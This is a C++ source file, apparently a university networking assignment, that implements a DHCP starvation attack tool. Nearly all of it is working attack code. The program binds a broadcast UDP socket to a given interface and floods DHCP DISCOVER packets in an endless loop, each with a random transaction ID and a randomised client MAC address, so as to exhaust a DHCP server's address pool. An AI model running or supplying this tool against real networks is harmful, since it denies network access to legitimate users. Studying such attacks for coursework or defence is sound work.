/*
  * IPK Projekt 2
  * xsajdi00
  * DHCP starvation attack
  */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>

#include <sys/time.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <net/if.h>
#include <signal.h>
#include <errno.h>

#include <iostream>
#include <sstream>
#include <fstream>

using namespace std;

int socket(string port);
int discover(int sock);
int send_packet(void* buffer, int buffer_size, int sock, struct sockaddr_in *dest);

void help(){
  printf("--Try this: ./ipk-dhcpstarve -i [interface]\n");
}

typedef struct dhcp_packet_struct{
        u_int8_t  op;
        u_int8_t  htype;
        u_int8_t  hlen;
        u_int8_t  hops;
        u_int32_t xid;
        u_int16_t secs;
        u_int16_t flags;
        struct in_addr ciaddr;
        struct in_addr yiaddr;
        struct in_addr siaddr;
        struct in_addr giaddr;
        unsigned char chaddr [16];
        char sname [64];
        char file [128];
	      char options[312];
        }dhcp_packet;

#define DHCP_SERVER_PORT   67
#define DHCP_CLIENT_PORT   68

void ctrl_C(int signal){
  fprintf(stdout,"Shutting down DHCP starvation attack - SIGNINT\n");
  exit(0);
}

char* net_interface;
  int sock;

int main (int argc, char **argv){
  srand(time(NULL));

  signal(SIGINT, ctrl_C);
  setlocale(LC_ALL,"");

  string port;
  string param;
  if(argc == 3){
    param = argv[1];
    if(param.compare("-i\n")){
      net_interface = argv[2];
    }else{
      help();
      exit(1);
    }
  }else{
    help();
    exit(1);
  }




  sock = socket(port);
  // while(1){
  int i = 0;//////////////////
  while(1)///////////////////////////////////
  {
    i++;
    cout<<"Sending "<<i<<".DHCP discovery packet"<<endl;
    discover(sock);
  }
  close(sock);

  return 0;
}

int socket(string port){


  struct sockaddr_in name;
  struct ifreq interface;

  int flag = 1;
  bzero(&name,sizeof(name));
  name.sin_family = AF_INET;
  name.sin_port = htons(DHCP_CLIENT_PORT);
  name.sin_addr.s_addr = INADDR_ANY;
  bzero(&name.sin_zero,sizeof(name.sin_zero));
  sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);

  if(sock < 0){
	   printf("Error: Could not create socket!\n");
	   exit(1);
	 }
  if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&flag,sizeof(flag))<0){
	   printf("Error: Could not set reuse address option on DHCP socket!\n");
	   exit(1);
  }

  if(setsockopt(sock,SOL_SOCKET,SO_BROADCAST,(char *)&flag,sizeof flag)<0){
    printf("Error: Could not set broadcast option on DHCP socket!\n");
    exit(1);
  }

  #if defined(__linux__)
  	strncpy(interface.ifr_ifrn.ifrn_name,net_interface,IFNAMSIZ);

  	if(setsockopt(sock,SOL_SOCKET,SO_BINDTODEVICE,(char *)&interface,sizeof(interface))<0){
  		printf("Error: Could not bind socket to interface %s.  Check your privileges...\n",net_interface);
  		exit(1);
  }

  #else
  	strncpy(interface.ifr_name,net_interface,IFNAMSIZ);
  #endif

  if(bind(sock,(struct sockaddr *)&name,sizeof(name))<0){
		printf("Error: Could not bind to DHCP socket (port %d)!  Check your privileges...\n",DHCP_CLIENT_PORT);
		exit(1);
  }


  return sock;
}

int discover(int sock){
  dhcp_packet disc_packet;
	struct sockaddr_in broadcast;
  bzero(&disc_packet,sizeof(disc_packet));
  struct in_addr requested_address;

  disc_packet.op=1;
  disc_packet.htype=1;
  disc_packet.hlen=6;
  disc_packet.hops=0;


  int packet_xid=random();
  //cout<<packet_xid<<endl;
  disc_packet.xid=htonl(packet_xid);
  ntohl(disc_packet.xid);
  disc_packet.secs=0;
  disc_packet.flags=htons(32768);
  disc_packet.options[0]='\x63';
  disc_packet.options[1]='\x82';
  disc_packet.options[2]='\x53';
  disc_packet.options[3]='\x63';
  disc_packet.options[4]=53;
  disc_packet.options[5]='\x01';
  disc_packet.options[6]=1;
  disc_packet.options[7]=255;

  char macA[6];
  macA[0] = random()%16;
  macA[1] = random()%16;
  macA[2] = random()%16;
  macA[3] = random()%16;
  macA[4] = random()%16;
  macA[5] = random()%16;

  memcpy(disc_packet.chaddr,macA,6);

  broadcast.sin_family=AF_INET;
  broadcast.sin_port=htons(DHCP_SERVER_PORT);
  broadcast.sin_addr.s_addr=INADDR_BROADCAST;
	bzero(&broadcast.sin_zero,sizeof(broadcast.sin_zero));

  send_packet(&disc_packet,sizeof(disc_packet),sock,&broadcast);
  return 0;

}

int send_packet(void* buffer, int buffer_size, int sock, struct sockaddr_in *dest){
  struct sockaddr_in name;
	int result;

	result=sendto(sock,(char *)buffer,buffer_size,0,(struct sockaddr *)dest,sizeof(*dest));
	if(result<0)
		return 1;

	return 0;
}
